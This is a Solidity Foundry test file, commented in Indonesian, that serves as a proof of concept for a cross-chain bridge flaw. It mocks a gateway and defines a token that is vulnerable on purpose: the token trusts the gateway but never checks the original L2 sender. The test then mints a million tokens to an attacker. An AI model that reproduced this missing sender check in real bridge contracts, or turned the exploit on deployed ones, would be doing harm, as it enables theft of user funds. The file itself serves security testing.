// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ==========================================
// 1. MOCK LIBRARIES (Biar gak error import)
// ==========================================

// Simulasi OpenZeppelin MerkleProof
library MerkleProof {
    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
        return processProof(proof, leaf) == root;
    }
    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
        bytes32 computedHash = leaf;
        for (uint256 i = 0; i < proof.length; i++) {
            computedHash = _hashPair(computedHash, proof[i]);
        }
        return computedHash;
    }
    function _hashPair(bytes32 a, bytes32 b) private pure returns (bytes32) {
        return a < b ? keccak256(abi.encodePacked(a, b)) : keccak256(abi.encodePacked(b, a));
    }
}

// Simulasi Solady OwnableRoles (Versi Minimal)
contract OwnableRoles {
    address public owner;
    uint256 public constant _ROLE_0 = 1 << 0;
    mapping(address => uint256) public roles;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized");
        _;
    }

    function _initializeOwner(address _owner) internal {
        owner = _owner;
        emit OwnershipTransferred(address(0), _owner);
    }

    function hasAnyRole(address user, uint256 role) public view returns (bool) {
        return (roles[user] & role) != 0;
    }
    
    function grantRole(address user, uint256 role) external onlyOwner {
        roles[user] |= role;
    }
}

// ==========================================
// 2. L1 GATEWAY (Kode Target dari Kamu)
// ==========================================
contract L1Gateway is OwnableRoles {
    uint256 public constant DELAY = 7 days;
    uint256 public constant OPERATOR_ROLE = _ROLE_0;

    bytes32 public root;
    uint256 public counter;
    address public xSender = address(0xBADBEEF); // Menyimpan alamat pengirim asal L2
    mapping(bytes32 id => bool finalized) public finalizedWithdrawals;

    error BadNewRoot();
    error EarlyWithdrawal();
    error InvalidProof();
    error AlreadyFinalized(bytes32 leaf);

    event ValidProof(bytes32[] proof, bytes32 root, bytes32 leaf);
    event FinalizedWithdrawal(bytes32 leaf, bool success, bool isOperator);

    constructor() {
        _initializeOwner(msg.sender);
    }

    function setRoot(bytes32 _root) external onlyOwner {
        if (_root == bytes32(0) || _root == root) revert BadNewRoot();
        root = _root;
    }

    function finalizeWithdrawal(
        uint256 nonce,
        address l2Sender,
        address target,
        uint256 timestamp,
        bytes memory message,
        bytes32[] memory proof
    ) external {
        if (timestamp + DELAY > block.timestamp) revert EarlyWithdrawal();

        // Hitung Leaf (ID Transaksi)
        bytes32 leaf = keccak256(abi.encode(nonce, l2Sender, target, timestamp, message));

        bool isOperator = hasAnyRole(msg.sender, OPERATOR_ROLE);
        if (!isOperator) {
            // Verifikasi Merkle Proof
            if (MerkleProof.verify(proof, root, leaf)) {
                emit ValidProof(proof, root, leaf);
            } else {
                revert InvalidProof();
            }
        }

        if (finalizedWithdrawals[leaf]) revert AlreadyFinalized(leaf);

        finalizedWithdrawals[leaf] = true;
        counter++;

        // SET CONTEXT: Siapa pengirim asli di L2?
        xSender = l2Sender; 
        
        // EKSEKUSI Call ke Target
        bool success;
        assembly {
            success := call(gas(), target, 0, add(message, 0x20), mload(message), 0, 0)
        }
        
        // RESET Context
        xSender = address(0xBADBEEF); 

        emit FinalizedWithdrawal(leaf, success, isOperator);
    }
}

// ==========================================
// 3. VULNERABLE TOKEN (Bug Simulation)
// ==========================================
// Ini adalah token yang salah implementasi. Dia percaya Gateway, 
// tapi lupa cek siapa yang kirim pesan lewat Gateway.
contract VulnerableToken {
    L1Gateway public gateway;
    mapping(address => uint256) public balances;

    constructor(address _gateway) {
        gateway = L1Gateway(_gateway);
        balances[address(this)] = 1_000_000 ether; // Dana Token di kontrak
    }

    // BUG DISINI:
    // Fungsi ini hanya mengecek msg.sender == gateway.
    // Seharusnya dia juga mengecek: gateway.xSender() == trustedL2Contract
    function bridgeMint(address to, uint256 amount) external {
        require(msg.sender == address(gateway), "Hanya Gateway yang boleh panggil");
        
        // KARENA TIDAK ADA CEK xSender, SIAPAPUN DARI L2 BISA MINTING!
        balances[to] += amount;
        balances[address(this)] -= amount;
    }
}

// ==========================================
// 4. TEST SCRIPT (The Attack)
// ==========================================
contract WithdrawalComplete is Test {
    L1Gateway gateway;
    VulnerableToken token;
    
    address attacker = makeAddr("attacker");
    address attackerL2 = makeAddr("attackerL2"); // Akun kita di L2
    
    // Data untuk Merkle Tree
    bytes32[] proof;
    bytes32 root;

    function setUp() public {
        // 1. Deploy System
        gateway = new L1Gateway();
        token = new VulnerableToken(address(gateway));

        // 2. SIMULASI L2: Kita buat Withdrawal Request Jahat
        // Pesan: "Token, tolong mint 1 Juta ke Attacker"
        bytes memory evilMessage = abi.encodeWithSelector(
            VulnerableToken.bridgeMint.selector, 
            attacker, 
            1_000_000 ether
        );

        uint256 nonce = 1;
        uint256 timestamp = block.timestamp;
        
        // 3. Hitung Leaf (Apa yang akan diverifikasi gateway)
        bytes32 leaf = keccak256(abi.encode(
            nonce, 
            attackerL2, // Pengirimnya kita sendiri (bukan admin L2)
            address(token), // Targetnya Token
            timestamp, 
            evilMessage
        ));

        // 4. Buat Merkle Tree Sederhana (Hanya 1 leaf -> Root = Leaf)
        // Di real world, ini akan digabung dengan tx user lain.
        root = leaf; 
        
        // 5. Update Root di Gateway (Simulasi Operator L1 mensinkronisasi data)
        gateway.setRoot(root);
        
        // Karena ada Delay 7 hari, kita majukan waktu
        vm.warp(block.timestamp + 7 days + 1 seconds);
    }

    function test_Withdrawal_Exploit() public {
        console.log("Saldo Awal Attacker:", token.balances(attacker));

        // --- SERANGAN ---
        vm.startPrank(attacker);

        // Kita construct ulang parameter yang sama dengan setup
        bytes memory evilMessage = abi.encodeWithSelector(
            VulnerableToken.bridgeMint.selector, 
            attacker, 
            1_000_000 ether
        );
        
        // Proof kosong karena tree cuma isi 1 leaf (root == leaf)
        // Kalau tree kompleks, kita butuh generate proof path.
        bytes32[] memory emptyProof = new bytes32[](0);

        // Panggil Finalize
        // Gateway akan mengecek proof -> Valid
        // Gateway akan panggil Token -> Token lihat pengirimnya Gateway -> Valid
        // Token transfer uang ke kita.
        gateway.finalizeWithdrawal(
            1, 
            attackerL2, 
            address(token), 
            block.timestamp - 7 days - 1 seconds, // Timestamp asli saat request
            evilMessage, 
            emptyProof
        );

        vm.stopPrank();
        // --- SELESAI ---

        console.log("Saldo Akhir Attacker:", token.balances(attacker));
        assertEq(token.balances(attacker), 1_000_000 ether, "Gagal Mencuri Token!");
    }
}
